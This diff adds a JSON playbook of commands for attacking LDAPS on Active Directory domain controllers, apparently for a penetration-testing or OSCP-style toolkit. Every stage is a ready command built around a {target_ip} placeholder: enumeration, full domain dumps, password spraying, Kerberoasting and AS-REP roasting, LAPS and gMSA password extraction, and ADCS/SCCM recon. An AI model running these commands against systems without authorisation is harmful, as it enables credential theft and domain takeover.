@@ -1,0 +1,168 @@
+{
+  "service": "ldapssl",
+  "port": 636,
+  "categories": [
+    {
+      "category": "1. Recon & Null Sessions",
+      "tasks": [
+        {
+          "id": "ldaps_nmap",
+          "title": "Nmap LDAPS Scripts",
+          "description": "Run default LDAP enumeration scripts against the secure port.",
+          "commands": [
+            "nmap -n -sV --script \"ldap* and not brute\" -p 636 {target_ip}"
+          ]
+        },
+        {
+          "id": "ldaps_anon_bind",
+          "title": "Anonymous / Null Bind (ldapsearch)",
+          "description": "Query the Domain Controller without credentials over SSL. Note the environment variable to bypass certificate warnings.",
+          "commands": [
+            "LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{target_ip} -s base namingcontexts",
+            "LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://{target_ip} -b \"DC=<domain>,DC=<local>\""
+          ]
+        },
+        {
+          "id": "ldaps_windapsearch_anon",
+          "title": "Windapsearch (Anonymous)",
+          "description": "Use windapsearch to automate the anonymous enumeration of users, groups, and computers.",
+          "commands": [
+            "windapsearch.py --dc-ip {target_ip} -U",
+            "windapsearch.py --dc-ip {target_ip} -G"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Authenticated Domain Dumps",
+      "tasks": [
+        {
+          "id": "ldaps_domaindump",
+          "title": "LDAPDomainDump (HTML Reports)",
+          "description": "Generate highly readable HTML and JSON reports of the entire Active Directory structure over LDAPS.",
+          "commands": [
+            "mkdir -p ldap_dump && LDAPTLS_REQCERT=never ldapdomaindump.py -u '<domain>\\<user>' -p '<password>' -o ./ldap_dump ldaps://{target_ip}:636"
+          ]
+        },
+        {
+          "id": "ldaps_ldeep_all",
+          "title": "Ldeep Full Backup",
+          "description": "Use Ldeep to dump the entire directory to disk securely for offline parsing.",
+          "commands": [
+            "ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s ldaps://{target_ip} all ./ldeep_dump"
+          ]
+        },
+        {
+          "id": "ldaps_search_ad",
+          "title": "LDAPSearch-AD Full Dump",
+          "description": "Comprehensive enumeration outputting to a clean log file.",
+          "commands": [
+            "ldapsearch-ad.py -l {target_ip} -d <domain> -u '<user>' -p '<password>' -o ldap_ad.log -t all"
+          ]
+        },
+        {
+          "id": "ldaps_bloodhound_ingest",
+          "title": "BloodHound Python / RustHound",
+          "description": "Collect Active Directory data from Linux for BloodHound mapping.",
+          "commands": [
+            "bloodhound-python -d <domain> -u '<user>' -p '<password>' -gc {target_ip} -c all",
+            "rusthound-ce -d <domain> -u '<user>@<domain>' -p '<password>' -o ./bloodhound.zip -z --ldap-filter=\"(objectGuid=*)\""
+          ]
+        }
+      ]
+    },
+    {
+      "category": "3. Spraying & Roasting",
+      "tasks": [
+        {
+          "id": "ldaps_password_spray",
+          "title": "Password Spraying (NetExec)",
+          "description": "Spray passwords securely against LDAPS using your custom wordlists.",
+          "commands": [
+            "netexec ldap {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --use-ldaps --continue-on-success"
+          ]
+        },
+        {
+          "id": "ldaps_kerberoasting",
+          "title": "Kerberoasting via LDAPS",
+          "description": "Query LDAPS for users with SPNs and request their TGS tickets for offline cracking.",
+          "commands": [
+            "nxc ldap {target_ip} -u '<user>' -p '<password>' --use-ldaps --kerberoasting hashes.kerberoast"
+          ]
+        },
+        {
+          "id": "ldaps_asreproasting",
+          "title": "AS-REPRoasting via LDAPS",
+          "description": "Check LDAPS for users who do not require Kerberos pre-authentication.",
+          "commands": [
+            "nxc ldap {target_ip} -u users.txt -p '' --use-ldaps --asreproast hashes.asreproast"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "4. Targeted AD Extractions",
+      "tasks": [
+        {
+          "id": "ldaps_msol_check",
+          "title": "Hunt for MSOL/Azure AD Accounts",
+          "description": "Dump user descriptions to hunt for plaintext Azure AD Connect passwords.",
+          "commands": [
+            "nxc ldap {target_ip} -u '<user>' -p '<password>' --use-ldaps -M get-desc-users | grep -i MSOL"
+          ]
+        },
+        {
+          "id": "ldaps_laps_passwords",
+          "title": "Extract LAPS Passwords",
+          "description": "Check if your compromised user has the rights to read cleartext LAPS passwords from computer objects.",
+          "commands": [
+            "nxc ldap {target_ip} -d <domain> -u '<user>' -p '<password>' --use-ldaps --module laps",
+            "ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s ldaps://{target_ip} laps"
+          ]
+        },
+        {
+          "id": "ldaps_gmsa_passwords",
+          "title": "Extract gMSA Passwords",
+          "description": "Attempt to read passwords for Group Managed Service Accounts (gMSA).",
+          "commands": [
+            "nxc ldap {target_ip} -u '<user>' -p '<password>' --use-ldaps --gmsa",
+            "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'"
+          ]
+        },
+        {
+          "id": "ldaps_password_policy",
+          "title": "Dump Password Policies",
+          "description": "Extract the default password policy and Fine-Grained Password Policies (PSO).",
+          "commands": [
+            "nxc smb {target_ip} -u '<user>' -p '<password>' --pass-pol",
+            "ldapsearch-ad.py --server {target_ip} -d <domain> -u '<user>' -p '<password>' --type pass-pols",
+            "ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s ldaps://{target_ip} pso"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "5. Advanced AD Recon (ADCS & SCCM)",
+      "tasks": [
+        {
+          "id": "ldaps_adcs_templates",
+          "title": "Enumerate ADCS Templates",
+          "description": "Search LDAPS for vulnerable Certificate Authority templates.",
+          "commands": [
+            "certipy find -u '<user>@<domain>' -p '<password>' -dc-ip {target_ip} -scheme ldaps",
+            "ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s ldaps://{target_ip} templates"
+          ]
+        },
+        {
+          "id": "ldaps_sccm_enum",
+          "title": "Enumerate SCCM Details",
+          "description": "Query LDAPS for SCCM deployment servers and site codes.",
+          "commands": [
+            "sccmhunter.py find -u '<user>' -p '<password>' -d '<domain>' -dc-ip {target_ip} -debug",
+            "ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s ldaps://{target_ip} sccm"
+          ]
+        }
+      ]
+    }
+  ]
+}
